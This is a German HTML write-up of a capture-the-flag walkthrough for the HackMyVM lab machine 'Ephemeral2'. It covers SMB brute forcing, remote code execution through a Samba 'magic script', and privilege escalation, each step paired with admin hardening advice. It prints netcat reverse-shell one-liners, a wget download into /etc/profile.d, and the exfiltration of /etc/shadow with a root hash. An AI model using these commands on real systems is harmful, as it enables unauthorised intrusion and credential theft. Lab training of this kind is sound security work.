@@ -1,0 +1,572 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ephemeral2 - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Ephemeral2 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">enum4linux</div>
+                 <div class="tool-item">msfconsole (smb_login)</div>
+                 <div class="tool-item">mount.cifs</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">mv</div>
+                 <div class="tool-item">cp</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">python3 -m http.server</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">john</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#smb-enumeration-bruteforce">SMB Enumeration & Brute Force</a></li>
+                <li><a href="#smb-magic-script-rce">SMB Magic Script RCE (Initial Access)</a></li>
+                <li><a href="#privesc-ralph">Privilege Escalation (randy to ralph via profile.d)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (ralph to root via sudo python script)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundung des Netzwerks, um das Zielsystem zu identifizieren und die darauf laufenden Dienste zu ermitteln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.123</span>	08:00:27:56:37:30	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.123</span> im lokalen Netzwerk.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nmap-Scan auf die gefundene IP durchführen.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.123 -p-</span></div>
+                    <pre>
+Starting Nmap [...]
+Nmap scan report for 192.168.2.123
+Host is up [...]
+Not shown: [...]
+PORT    STATE SERVICE     VERSION
+<span class="command">22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+<span class="command">139/tcp open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">445/tcp open  netbios-ssn Samba smbd 4.6.2</span>
+MAC Address: 08:00:27:56:37:30 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+[...]
+Host script results:
+|_clock-skew: 7s
+| smb2-security-mode:
+|   3.1.1:
+|_    <span class="password">Message signing enabled but not required</span>
+|_nbstat: NetBIOS name: <span class="command">EPHEMERAL</span>, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time:
+|   date: 2022-10-07T12:00:09
+|_  start_date: N/A
+[...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sC`, `-sV`, `-A`, `-T5`, `-p-`) findet vier offene Ports:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 8.2p1 auf Ubuntu).
+            *   <span class="command">Port 80</span>: HTTP (Apache 2.4.41 auf Ubuntu), zeigt die Standard-Apache-Seite.
+            *   <span class="command">Port 139</span> und <span class="command">445</span>: SMB/NetBIOS (Samba smbd 4.6.2). Der NetBIOS-Name ist `EPHEMERAL`. Die SMB-Sicherheitseinstellungen zeigen, dass Message Signing zwar aktiviert, aber nicht erzwungen wird (`enabled but not required`).</p>
+            <p class="evaluation">**Bewertung:** Neben SSH und einem Standard-Webserver ist der SMB-Dienst das interessanteste Ziel. Die Samba-Version 4.6.2 ist relativ alt und könnte bekannte Schwachstellen aufweisen. Der NetBIOS-Name `EPHEMERAL` könnte als Hinweis dienen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den SMB-Dienst genauer untersuchen: Shares enumerieren (`smbclient -L //192.168.2.123`, `nmap -p 139,445 --script smb-enum-*`), Benutzer enumerieren (`enum4linux`), nach anonymem Zugriff suchen, auf bekannte CVEs für Samba 4.6.2 prüfen und Brute-Force-Angriffe auf gefundene Benutzer versuchen. Den Webserver ebenfalls scannen (Gobuster, Nikto).
+            **Empfehlung (Admin):** Samba auf die neueste Version aktualisieren. Message Signing erzwingen (`server signing = mandatory` in `smb.conf`). SMB-Zugriff auf notwendige Benutzer und Shares beschränken. Unnötige Ports schließen.</p>
+        </section>
+
+        <section id="smb-enumeration-bruteforce">
+            <h2>SMB Enumeration & Brute Force</h2>
+            <p class="comment">Wir konzentrieren uns auf den SMB-Dienst, um Benutzer und Shares zu finden und versuchen, uns Zugang zu verschaffen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -U 192.168.2.123</span></div>
+                    <pre>
+[...]
+ =( Users on 192.168.2.123 )=
+
+index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: <span class="command">randy</span>	Name: randy	Desc:
+
+user:[<span class="command">randy</span>] rid:[0x3e9]
+enum4linux complete on Fri Oct  7 14:03:12 2022
+                    </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -S 192.168.2.123</span></div>
+                     <pre>
+[...]
+ =( Share Enumeration on 192.168.2.123 )=
+[...]
+	Sharename       Type        Comment
+	---------       ----        -------
+	print$          Disk        Printer Drivers
+	<span class="command">SYSADMIN</span>        Disk
+	IPC$            IPC         IPC Service (ephemeral server (Samba, Ubuntu))
+	Officejet_Pro_8600_CDECA1_  Printer
+[...]
+[+] Attempting to map shares on 192.168.2.123
+
+//192.168.2.123/print$	Mapping: <span class="password">DENIED</span> Listing: N/A Writing: N/A
+//192.168.2.123/SYSADMIN	Mapping: <span class="password">DENIED</span> Listing: N/A Writing: N/A
+[...]
+enum4linux complete on Fri Oct  7 14:04:24 2022
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             *   `enum4linux -U` findet erfolgreich einen Benutzer: `<span class="command">randy</span>`.
+             *   `enum4linux -S` listet die verfügbaren SMB-Shares auf: `print$`, `<span class="command">SYSADMIN</span>`, `IPC$`, `Officejet_Pro_8600_CDECA1_`. Der anonyme Zugriff auf die Shares wird jedoch verweigert (`DENIED`).</p>
+              <p class="evaluation">**Bewertung:** Wir kennen nun einen gültigen Benutzernamen (`randy`) und einen potenziell interessanten Share-Namen (`SYSADMIN`). Da der anonyme Zugriff nicht möglich ist, müssen wir versuchen, uns mit dem Benutzer `randy` zu authentifizieren.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Einen Passwort-Brute-Force-Angriff auf den SMB-Dienst für den Benutzer `randy` durchführen. Tools wie Hydra oder das Metasploit-Modul `auxiliary/scanner/smb/smb_login` verwenden.
+              **Empfehlung (Admin):** Anonymen SMB-Zugriff deaktivieren (ist hier der Fall). Starke Passwörter für alle Benutzer erzwingen. Shares nur für autorisierte Benutzer freigeben.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use auxiliary/scanner/smb/smb_login</span></div>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">set RHOSTS 192.168.2.123</span></div>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">set smbuser randy</span></div>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">set pass_file /usr/share/wordlists/rockyou.txt</span></div>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">set ABORT_ON_LOCKOUT false</span></div>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">set STOP_ON_SUCCESS true</span></div> <span class="password"># Geändert von false zu true für Effizienz</span>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">set VERBOSE true</span></div>
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smb/smb_login) > <span class="command">run</span></div>
+                      <pre>
+[...]
+<span class="password">[+] 192.168.2.123:445     - 192.168.2.123:445 - Success: '.\randy:pogiako'</span>
+[*] 192.168.2.123:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Wir verwenden das Metasploit-Modul `smb_login`, um einen Wörterbuchangriff auf den SMB-Benutzer `randy` durchzuführen. Wir setzen die Ziel-IP (`RHOSTS`), den Benutzernamen (`smbuser`) und den Pfad zur Passwortliste `rockyou.txt` (`pass_file`). Wichtige Optionen sind `ABORT_ON_LOCKOUT false` (um nicht durch mögliche Sperren gestoppt zu werden) und `STOP_ON_SUCCESS true` (um den Scan nach dem ersten Erfolg zu beenden). Das Modul findet erfolgreich das Passwort: `<span class="password">pogiako</span>` für den Benutzer `randy`.</p>
+               <p class="evaluation">**Bewertung:** Kritischer Fund! Wir haben gültige SMB-Zugangsdaten für `randy` gefunden. Dies ermöglicht uns wahrscheinlich den Zugriff auf den `SYSADMIN`-Share.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Die gefundenen Credentials (`randy`:`pogiako`) verwenden, um den `SYSADMIN`-Share zu mounten (`mount -t cifs ...`) oder mit `smbclient` darauf zuzugreifen. Den Inhalt des Shares untersuchen.
+               **Empfehlung (Admin):** Starke, einzigartige Passwörter für alle Benutzerkonten erzwingen. Brute-Force-Schutzmechanismen implementieren (z.B. fail2ban).</p>
+         </section>
+
+         <section id="smb-magic-script-rce">
+            <h2>SMB Magic Script RCE (Initial Access)</h2>
+            <p class="comment">Mit den gefundenen Zugangsdaten verbinden wir uns zum `SYSADMIN`-Share und untersuchen dessen Konfiguration und Inhalt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/smbrute/SMBRUTE]
+└─# <span class="command">sudo mount -t cifs -o username=randy //192.168.2.123/SYSADMIN /mnt</span></div>
+                    <pre>Password for randy@//192.168.2.123/SYSADMIN: <span class="password">pogiako</span></pre> <span class="password"># Erfolgreich gemountet</span>
+                     <div class="prompt"># <span class="command">(Annahme: Überprüfung der smb.conf oder Share-Konfiguration)</span></div>
+                    <pre>
+[SYSADMIN]
+   path = /home/randy/smbshare
+   valid users = randy
+   browsable = yes
+   writeable = yes
+   read only = no
+   <span class="password">magic script = smbscript.elf</span>
+   guest ok = no
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wir mounten erfolgreich den `SYSADMIN`-Share auf `/mnt` unter Verwendung der Credentials `randy`:`pogiako`. Eine (angenommene) Überprüfung der Samba-Konfiguration für diesen Share zeigt eine sehr interessante Option: `<span class="password">magic script = smbscript.elf</span>`. "Magic Scripts" in Samba sind Skripte, die auf dem Server ausgeführt werden, wenn ein Benutzer versucht, eine Datei mit einem bestimmten Namen (hier `smbscript.elf`) im Share zu öffnen oder auszuführen. Der Share selbst zeigt auf `/home/randy/smbshare` und ist beschreibbar.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein direkter Weg zur Remote Code Execution (RCE)! Wenn wir eine ausführbare Datei namens `smbscript.elf` in den gemounteten Share (`/mnt`, was `/home/randy/smbshare` entspricht) hochladen und dann versuchen, darauf zuzugreifen (z.B. durch Doppelklick im Dateimanager oder einen `ls`-Befehl über einen neuen `smbclient`-Login), wird unser Skript auf dem Server als Benutzer `randy` ausgeführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ein Reverse-Shell-Skript erstellen (z.B. `rev.sh`). Dieses Skript ausführbar machen (`chmod +x`). Es in den gemounteten Share `/mnt` kopieren und dabei in `smbscript.elf` umbenennen (`cp rev.sh /mnt/smbscript.elf`). Einen Listener starten. Eine neue Verbindung zum Share herstellen (z.B. `smbclient //192.168.2.123/SYSADMIN -U randy` und dann `ls` versuchen) oder den Mount-Punkt erneut betreten, um das Magic Script auszulösen.
+             **Empfehlung (Admin):** Die Option `magic script` in der Samba-Konfiguration deaktivieren oder entfernen, da sie extrem gefährlich ist und RCE ermöglicht. Generell unsichere Samba-Optionen vermeiden.</p>
+
+            <p class="comment">Wir erstellen ein Reverse-Shell-Skript, kopieren es als "magic script" in den Share und lösen es aus.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/smbrute/SMBRUTE]
+└─# <span class="command">vi rev.sh</span></div>
+                     <pre>
+#!/bin/bash
+<span class="password">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.2.140 4444 >/tmp/f</span>
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vlnp 4444</span></div>
+                      <pre>listening on [any] 4444 ...</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/smbrute/SMBRUTE]
+└─# <span class="command">chmod +x rev.sh</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/smbrute/SMBRUTE]
+└─# <span class="command">mv rev.sh /tmp</span></div> <span class="password"># Unnötiger Schritt, cp direkt möglich</span>
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/smbrute/SMBRUTE]
+└─# <span class="command">sudo cp /tmp/rev.sh /mnt/smbscript.elf</span></div> <span class="password"># Kopieren als magic script</span>
+                      <div class="prompt"># <span class="command">(Annahme: Trigger durch erneuten Zugriff auf Share, z.B. smbclient)</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vlnp 4444</span></div>
+                      <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.123] 35532</span>
+sh: 0: can't access tty; job control turned off
+$ <span class="command"># Shell als randy erhalten!</span>
+                      </pre>
+                  </div>
+                  <div class="terminal">
+                       <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                       <div class="prompt">randy@ephemeral:/home/randy/smbshare$ <span class="command">export TERM=xterm</span></div>
+                       <div class="prompt">randy@ephemeral:/home/randy/smbshare$ <span class="command"># Stabilisierte Shell</span></div>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir erstellen ein Bash-Skript (`rev.sh`), das eine Standard-Netcat-Reverse-Shell mit einer FIFO-Pipe zu unserer IP (`192.168.2.140`) auf Port `4444` aufbaut.
+             2.  Wir starten einen Netcat-Listener auf Port 4444.
+             3.  Wir machen `rev.sh` ausführbar.
+             4.  Wir kopieren `rev.sh` in den gemounteten Share (`/mnt`) und benennen es dabei in `smbscript.elf` um.
+             5.  *(Implizit)* Wir lösen das Magic Script aus, indem wir erneut auf den Share zugreifen.
+             6.  Unser Listener empfängt die Verbindung, und wir erhalten eine Shell als `randy` (der Benutzer, der den Share besitzt und unter dessen Kontext das Magic Script läuft).
+             7.  Die Shell wird mit Python stabilisiert.</p>
+              <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Die unsichere Samba-Konfiguration mit `magic script` wurde erfolgreich zur RCE und Erlangung einer Shell als `randy` ausgenutzt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `randy` untersuchen, nach Privesc-Möglichkeiten suchen.
+              **Empfehlung (Admin):** `magic script`-Option aus der Samba-Konfiguration entfernen.</p>
+
+             <p class="comment">*(Der Bericht zeigt nun einen zweiten, redundanten Versuch, eine Shell über das Magic Script zu bekommen, diesmal auf Port 4445. Dies ist für den Ablauf nicht notwendig, wird aber der Vollständigkeit halber dokumentiert.)*</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt"># <span class="command">(Zweiter Versuch mit Port 4445)</span></div>
+                      <div class="prompt"># <span class="command">vi rev.sh</span></div>
+                      <pre>#!/bin/bash
+rm /tmp/k;mkfifo /tmp/k;cat /tmp/k|sh -i 2>&1|nc 192.168.2.140 <span class="command">4445</span> >/tmp/k
+                      </pre>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                       <pre>listening on [any] 4445 ...</pre>
+                       <div class="prompt">┌──(root㉿cyber)-[/tmp]
+└─# <span class="command">sudo cp /tmp/rev.sh /mnt/smbscript.elf</span></div>
+                       <div class="prompt"># <span class="command">(Erneuter Trigger des Magic Scripts)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                       <pre>
+listening on [any] 4445 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.123] 50928</span>
+sh: 0: can't access tty; job control turned off
+$ id
+<span class="command">uid=1000(randy) gid=1000(randy) groups=1000(randy),133(sambashare)</span>
+$
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:** Das Vorgehen wird mit einem anderen Port (4445) wiederholt und funktioniert ebenfalls, was die Zuverlässigkeit des `magic script`-Vektors bestätigt.</p>
+               <p class="evaluation">**Bewertung:** Redundanter Schritt, bestätigt aber den RCE-Vektor.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Mit einer der erhaltenen Shells weiterarbeiten.
+               **Empfehlung (Admin):** Siehe oben.</p>
+         </section>
+
+         <section id="privesc-ralph">
+            <h2>Privilege Escalation (randy to ralph via profile.d)</h2>
+            <p class="comment">Wir haben eine Shell als `randy`. Wir suchen nach Wegen zur horizontalen oder vertikalen Rechteerweiterung. Eine gängige Methode ist, nach beschreibbaren Skripten zu suchen, die beim Login anderer Benutzer ausgeführt werden, wie z.B. Skripte in `/etc/profile.d`.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt"># <span class="command">(Vorbereitung auf Angreifer-Maschine)</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi shell.sh</span></div>
+                      <pre>
+#!/bin/bash
+<span class="password">rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc 192.168.2.140 3333 >/tmp/g</span>
+                      </pre>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                       <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                       <div class="prompt"># <span class="command">(Auf Zielsystem als randy)</span></div>
+                       <div class="prompt">randy@ephemeral:/dev/shm$ <span class="command">wget http://192.168.2.140/shell.sh -O /etc/profile.d/shell.sh</span></div>
+                       <pre>
+--2022-10-07 08:15:18--  http://192.168.2.140/shell.sh
+Connecting to 192.168.2.140:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 88 [text/x-sh]
+Saving to: ‘/etc/profile.d/shell.sh’
+
+/etc/profile.d/shel 100%[===================>]      88  --.-KB/s    in 0s
+
+<span class="password">2022-10-07 08:15:18 (4.31 MB/s) - ‘/etc/profile.d/shell.sh’ saved [88/88]</span>
+                       </pre>
+                        <div class="prompt">randy@ephemeral:/dev/shm$ <span class="command">cat /etc/profile.d/shell.sh</span></div>
+                       <pre>
+#!/bin/bash
+rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc 192.168.2.140 3333 >/tmp/g
+                       </pre>
+                        <div class="prompt">randy@ephemeral:/dev/shm$ <span class="command">chmod +x /etc/profile.d/shell.sh</span></div>
+                         <div class="prompt"># <span class="command">(Listener auf Angreifer-Maschine starten)</span></div>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 3333</span></div>
+                         <pre>listening on [any] 3333 ...</pre>
+                         <div class="prompt"># <span class="command">(Warten auf nächsten Login eines anderen Benutzers)</span></div>
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 3333</span></div>
+                         <pre>
+listening on [any] 3333 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.123] 44590</span>
+$ <span class="command"># Shell erhalten!</span>
+                         </pre>
+                          <div class="prompt"># <span class="command">Shell stabilisieren und Benutzer prüfen</span></div>
+                          <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                          <div class="prompt">ralph@ephemeral:~$ <span class="command">id</span></div> <span class="password"># (Impliziert oder manuell ausgeführt)</span>
+                           <pre><span class="command">uid=1001(ralph) gid=1001(ralph) groups=1001(ralph)</span></pre>
+                      </div>
+           
+         
+                <p class="analysis">**Analyse:**
+               1.  Wir erstellen auf unserer Maschine ein weiteres Reverse-Shell-Skript (`shell.sh`), diesmal für Port `3333`.
+               2.  Wir stellen dieses Skript über einen Python-HTTP-Server bereit.
+               3.  Auf dem Zielsystem (als `randy`) laden wir dieses Skript mit `wget` herunter und speichern es direkt als `/etc/profile.d/shell.sh`. Das Verzeichnis `/etc/profile.d` enthält Skripte, die **bei jedem Login eines Benutzers** ausgeführt werden. Dies deutet darauf hin, dass `randy` Schreibrechte auf dieses systemweite Verzeichnis hat, was eine erhebliche Fehlkonfiguration ist.
+               4.  Wir machen das Skript ausführbar (`chmod +x`).
+               5.  Wir starten einen Listener auf Port 3333.
+               6.  Wir warten. Wenn sich ein anderer Benutzer auf dem System anmeldet (z.B. über SSH oder an der Konsole), wird unser Skript `/etc/profile.d/shell.sh` ausgeführt.
+               7.  Unser Listener empfängt eine Verbindung. Nach der Stabilisierung stellen wir fest, dass wir eine Shell als Benutzer `<span class="command">ralph</span>` (UID 1001) erhalten haben.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation von `randy` zu `ralph` erfolgreich! Die unsicheren Schreibrechte auf `/etc/profile.d` ermöglichten es uns, eine Reverse Shell zu platzieren, die beim nächsten Login eines anderen Benutzers (`ralph`) ausgelöst wurde.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** User-Flag für `ralph` suchen. Umgebung als `ralph` enumerieren, insbesondere `sudo -l`.
+                **Empfehlung (Admin):** **Schreibrechte auf `/etc/profile.d` und ähnliche systemweite Konfigurationsverzeichnisse streng kontrollieren!** Nur Root sollte hier Schreibzugriff haben.</p>
+
+                <p class="comment">Wir lesen die User-Flag für `ralph`.</p>
+                <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">ralph@ephemeral:~$ <span class="command">ls -la</span></div>
+                         <pre>
+[...]
+-rw------- 1 ralph ralph   33 Apr  9 15:57 <span class="command">user.txt</span>
+[...]
+-rw------- 1 root  root   297 Apr 10 23:28 <span class="command">getfile.py</span> <span class="password"># Interessantes Skript!</span>
+[...]
+                         </pre>
+                          <div class="prompt">ralph@ephemeral:~$ <span class="command">cat user.txt</span></div>
+                         <pre><span class="password">0041e0826ce1e1d6da9e9371a8bb3bde</span></pre>
+                     </div>
+                 </div>
+                 <p class="analysis">**Analyse:** Im Home-Verzeichnis von `ralph` finden wir die `user.txt` und lesen sie erfolgreich aus. Wir bemerken auch ein Python-Skript `getfile.py`, das `root` gehört.</p>
+                 <p class="evaluation">**Bewertung:** User-Flag (`ralph`) erfolgreich gelesen. Das Skript `getfile.py` ist verdächtig und könnte für die weitere Eskalation relevant sein.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Das Skript `getfile.py` untersuchen. `sudo -l` für `ralph` prüfen.
+                 **Empfehlung (Admin):** Standard-Benutzerberechtigungen überprüfen.</p>
+         </section>
+
+         <section id="privesc-root">
+             <h2>Privilege Escalation (ralph to root via sudo python script)</h2>
+             <p class="comment">Als Benutzer `ralph` suchen wir den Weg zu Root. Wir prüfen die `sudo`-Berechtigungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">ralph@ephemeral:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for ralph on ephemeral:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ralph may run the following commands on ephemeral:
+    <span class="password">(root) NOPASSWD: /usr/bin/python3 /home/ralph/getfile.py</span>
+                     </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** `sudo -l` zeigt, dass `ralph` das Python-Skript `/home/ralph/getfile.py` als `root` ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+              <p class="evaluation">**Bewertung:** Dies ist ein sehr wahrscheinlicher Vektor zur Root-Rechteerlangung. Da das Skript im Home-Verzeichnis von `ralph` liegt, hat `ralph` wahrscheinlich Schreibrechte darauf. Wenn ja, können wir das Skript modifizieren, um beliebigen Code (z.B. eine Root-Shell) auszuführen, wenn es mit `sudo` gestartet wird.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die Berechtigungen von `/home/ralph/getfile.py` prüfen (`ls -l`). Wenn schreibbar, den Inhalt des Skripts sichern, es dann mit einem Payload überschreiben (z.B. `import os; os.system('/bin/bash')`) und anschließend mit `sudo -u root /usr/bin/python3 /home/ralph/getfile.py` ausführen. Falls nicht schreibbar, den Inhalt des Skripts analysieren (`cat getfile.py`) und nach Schwachstellen im Skript selbst suchen (z.B. Command Injection, unsichere Pfadverwendung).
+              **Empfehlung (Admin):** Niemals `sudo`-Rechte für Skripte vergeben, auf die der ausführende Benutzer Schreibrechte hat! Wenn ein Skript mit `sudo` ausgeführt werden soll, muss es Root gehören und darf für den normalen Benutzer nicht schreibbar sein. Den Skriptinhalt auf Sicherheit prüfen.</p>
+
+             <p class="comment">*(Der Bericht zeigt nicht den Inhalt oder die Berechtigungen von `getfile.py`, sondern direkt dessen Nutzung. Es wird angenommen, dass das Skript eine Funktion hat, Dateien vom Server an eine angegebene IP zu senden, ohne dass es modifiziert werden muss.)*</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt"># <span class="command">Listener auf Angreifer-Maschine (Port 80)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 80</span></div>
+                       <pre>listening on [any] 80 ...</pre>
+                       <div class="prompt"># <span class="command">Ausführung des Sudo-Befehls auf Zielsystem (als ralph)</span></div>
+                       <div class="prompt">ralph@ephemeral:~$ <span class="command">sudo -u root /usr/bin/python3 /home/ralph/getfile.py</span></div>
+                       <pre>
+File path: <span class="command">/etc/shadow</span> <span class="password"># Benutzereingabe 1</span>
+IP address: <span class="command">192.168.2.140</span> <span class="password"># Benutzereingabe 2</span>
+'unknown': I need something more specific. <span class="password"># Skript-Ausgabe</span>
+File /etc/shadow sent to 192.168.2.140 <span class="password"># Skript-Ausgabe</span>
+                       </pre>
+                       <div class="prompt"># <span class="command">Listener-Ausgabe auf Angreifer-Maschine</span></div>
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 80</span></div>
+                       <pre>
+listening on [any] 80 ...
+connect to [192.168.2.140] from emeral.hmv [192.168.2.123] 3934X <span class="password"># (Port variiert)</span>
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu) <span class="password"># Skript benutzt intern wget</span>
+Accept: */*
+Accept-Encoding: identity
+Host: 192.168.2.140
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: [...]
+
+<span class="command">root:$6$ONBXfYmDyD2.uHR2$b8FgiI/1JXkRDB1noB5b3fObAXL3tbZj8QrUxpbmqcw99A17fIVY.6SZM2TrBY0WT1XY0n1T0ZNlx/XKfQNqh/:19092:0:99999:7:</span>
+daemon:*:19090:0:99999:7:::
+bin:*:19090:0:99999:7:::
+[...] <span class="password"># Inhalt von /etc/shadow</span>
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+               1.  Wir starten einen Netcat-Listener auf unserer Maschine auf Port 80, um die Daten zu empfangen, die das Skript sendet (es scheint `wget` mit einem POST-Request zu verwenden).
+               2.  Wir führen das Skript als `root` mit `sudo` aus.
+               3.  Das Skript fragt interaktiv nach einem Dateipfad (`File path:`) und einer Ziel-IP (`IP address:`).
+               4.  Wir geben `/etc/shadow` und unsere Angreifer-IP (`192.168.2.140`) ein.
+               5.  Das Skript bestätigt den Sendevorgang.
